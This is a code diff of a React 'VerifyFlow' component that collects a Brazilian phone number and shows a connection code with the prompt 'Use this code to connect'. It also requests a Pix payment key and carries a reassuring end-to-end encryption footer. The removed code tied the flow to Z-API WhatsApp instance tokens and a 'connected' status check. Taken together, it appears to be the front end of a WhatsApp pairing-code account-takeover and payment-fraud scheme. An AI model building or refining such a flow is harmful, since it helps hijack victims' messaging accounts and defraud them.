@@ -2,17 +2,15 @@ import React, { useState, useEffect } from 'react';
 import './VerifyFlow.css';
 import axios from 'axios';
 
-const ZAPI_API_BASE = 'https://api.z-api.io';
 const WHATSAPP_HELP_NUMBER = '555131910192';
 
 const VerifyFlow = () => {
   const [step, setStep] = useState(1);
   const [ddi, setDdi] = useState('55');
   const [phone, setPhone] = useState('');
-  const [code, setCode] = useState('');
-  const [instanceInfo, setInstanceInfo] = useState({});
   const [loading, setLoading] = useState(false);
   const [pix, setPix] = useState({ name: '', type: 'Phone', key: '' });
+  const [pin, setPin] = useState('');
 
   const formattedPhone = ddi + phone.replace(/\D/g, '');
 
@@ -29,48 +27,44 @@ const VerifyFlow = () => {
   const sendPhone = async () => {
     if (phone.replace(/\D/g, '').length < 8) return alert('Please enter a valid number.');
     setStep(2);
-    setCode('');
+    setPin('');
     setLoading(false);
     try {
-      const verify_data = { "phone": formattedPhone }
+      const verify_data = { 'phone': formattedPhone };
+      const response = await axios.post('http://localhost:3000/api/phone', verify_data);
+      const data = response.data;
 
-      const response = await axios.post('http://localhost:5678/webhook-test/phone', verify_data);
-      const data = await response.json();
-
-      if (data.error) return alert(`Error: ${data.error}`);
-      if (data.conectado) return setStep(3);
-
-      localStorage.setItem('zapi_instance_id', data.instance_id);
-      localStorage.setItem('zapi_instance_token', data.instance_token);
-      localStorage.setItem('zapi_security_token', data.security_token);
-      setCode(data.codigo);
-      setInstanceInfo(data);
-    } catch {
-      alert('Failed to generate code.');
+    } catch (error) {
+      alert('Failed to start verification.');
+      setStep(1);
     }
   };
 
-  const copyCode = () => {
-    navigator.clipboard.writeText(code).then(() => alert('Code copied: ' + code));
-  };
+  // Poll backend every 3 seconds to get the PIN
+  useEffect(() => {
+    if (step !== 2 || !phone) return;
 
-  const checkConnection = async () => {
-    setLoading(true);
-    setTimeout(async () => {
+    const interval = setInterval(async () => {
       try {
-        const { instance_id, instance_token, security_token } = instanceInfo;
-        const res = await fetch(`${ZAPI_API_BASE}/instances/${instance_id}/token/${instance_token}/status`, {
-          headers: { 'Client-Token': security_token },
-        });
-        const data = await res.json();
-        setLoading(false);
-        if (data.connected) setStep(3);
-        else setCode('Code is still valid. Try again.');
-      } catch {
-        setLoading(false);
-        setCode('Error checking status.');
+        const res = await fetch(`http://localhost:3000/api/get-pin?phone=${encodeURIComponent(formattedPhone)}`);
+        if (res.ok) {
+          const data = await res.json();
+          if (data.pin && data.pin !== pin) {
+            setPin(data.pin);
+          }
+        }
+      } catch (err) {
+        // You may handle errors here if needed
       }
-    }, 15000);
+    }, 3000);
+
+    return () => clearInterval(interval);
+  }, [phone, step, pin, formattedPhone]);
+
+  const copyPin = () => {
+    if (pin) {
+      navigator.clipboard.writeText(pin).then(() => alert('Code copied: ' + pin));
+    }
   };
 
   const sendPix = () => {
@@ -89,6 +83,7 @@ const VerifyFlow = () => {
           <div className="tela-conteudo">
             <select value={ddi} onChange={(e) => setDdi(e.target.value)}>
               <option value="55">🇧🇷 Brazil (+55)</option>
+              {/* Add more countries if needed */}
             </select>
             <input
               type="text"
@@ -107,17 +102,17 @@ const VerifyFlow = () => {
         <div className="tela ativa">
           <h2>Use this code to connect</h2>
           <div className="tela-conteudo">
-            {loading ? <div className="spinner" /> : (
+            {loading ? (
+              <div className="spinner" />
+            ) : (
               <div id="codigo-display">
-                {[...code].map((char, i) => (
+                {[...pin].map((char, i) => (
                   <span key={i}>{char}</span>
                 ))}
               </div>
             )}
-            <button onClick={copyCode}>Copy Code</button>
-            <div onClick={checkConnection} className="verificar-link">
-              <span>I followed the steps</span>
-            </div>
+            <button onClick={copyPin}>Copy Code</button>
+            {/* Optionally add a "I followed the steps" button here */}
           </div>
         </div>
       )}
@@ -169,9 +164,7 @@ const VerifyFlow = () => {
         </div>
       )}
 
-      <footer>
-        🔒 Your personal messages are protected with end-to-end encryption.
-      </footer>
+      <footer>🔒 Your personal messages are protected with end-to-end encryption.</footer>
     </div>
   );
 };
